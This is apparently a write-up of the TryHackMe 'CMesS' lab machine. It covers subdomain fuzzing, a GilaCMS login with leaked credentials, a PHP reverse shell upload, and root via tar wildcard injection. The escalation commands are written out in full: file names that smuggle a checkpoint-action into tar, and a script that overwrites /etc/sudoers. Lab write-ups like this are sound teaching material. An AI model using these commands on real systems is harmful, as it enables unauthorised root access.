<a href="https://tryhackme.com/room/cmess">Link</a> to the machine on Tryhackme.

Starting with what is told to do by machine author.
Making an entry for the ip in /etc/hosts.

Added ***10.10.10.185.18  cmess.thm*** to the /etc/hosts file.

Scanning for open ports gives,
```bash
nmap -T4 -p- -A 10.10.185.18

The website hosted at port 80 contains robots.txt
![placeholder](/writeup/assets/img/cmess/robots.png "robot")

Accessing all the directories listed in robots.txt gives FORBIDDEN 403 error.
Directory and file file busting through ffuf gives
 ![placeholder](/writeup/assets/img/cmess/directory.png "directory")
 admin directory gives a login page.
 ![placeholder](/writeup/assets/img/cmess/login.png "login")
 The website is working with GilaCMS as written on the homepage.
 Nothing interesting found yet. Searching for exploits also is not much helpful as version of gilacms is still unknown.
 
 Then I thought to go for subdomains.
 ```bash
 ffuf -w sublists -u http://cmess.thm -H "Host: FUZZ.cmess.thm" -fw 522
 
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2

dev                     [Status: 200, Size: 934, Words: 191, Lines: 31]

## Here fw specifies the amount of words to filter. This can be set as first run the scan without fw and see the response which are getting 200 and
## note the number of words in their response.That number which is common in most use it as word filter(fw) in the next scan
```
So I got a subdomain dev.
Make an entry of this subdomain in the /etc/hosts file.
It will look like
![placeholder](/writeup/assets/img/cmess/hosts.png "hosts")

Now accessing the subdomain *dev.cmess.thm* gives
![placeholder](/writeup/assets/img/cmess/mail.png "mail")

Got an email and a password.

**andre@cmess.thm:KPFTN_f2yxe%**
Used it to login at the login page.
 ![placeholder](/writeup/assets/img/cmess/gila.png "gilacms")
 
Clicked on Content and then file manager and reached the directory where all the files related to website are stored.
Uploaded a php reverse shell with the upload option inside assets directory.

Accessed the php file at *http://cmess.thm/assets/phpshell.php* and got the reverse shell.
![placeholder](/writeup/assets/img/cmess/shell.png "shell")

Found .password.bak file inside /opt/. Found a password inside the file.
```bash
cat .password.bak
andres backup password
UQfsdCB7aAP6
```
Used this password to login with ssh as andre user.
![placeholder](/writeup/assets/img/cmess/ssh.png "ssh")

Got the user.txt.

Uploaded Linpeas.sh using wget and ran it.

This showed a 99% P.E. Vector at a cron job
![placeholder](/writeup/assets/img/cmess/linpeas.png "cron")

This cronjob is using tar with wildcard(*).So I used wildcard injection.
Executed these commands.
```bash
echo 'echo "andre ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo "" > --checkpoint=1

##tar command uses **checkpoint-action=ACTION** argument to execute the ACTION on each checkpoint

##--checkpoint[=NUMBER]
  ##  display progress messages every NUMBERth record (default 10)
```
You can learn more about tar wildcard injection <a href="https://medium.com/@int0x33/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e">here</a>.

The above commands create three files
* A file named privesc.sh; which contains the commands I want to run
* A file named "--checkpoint-action=exec=sh privesc.sh";this will trigger the tar command to execute privesc.sh when a checkpoint is reached.
* A file named "--checkpoint=1"; this will make checkpoint-action to trigger at every 1th record read rather than default 10th record read.

Now when the cron job executes it creates an entry in sudoers file to grant andre user permission to run sudo for all commands without asking for password.

Changed the user to root.

```bash
sudo su
```

Got the root.txt.
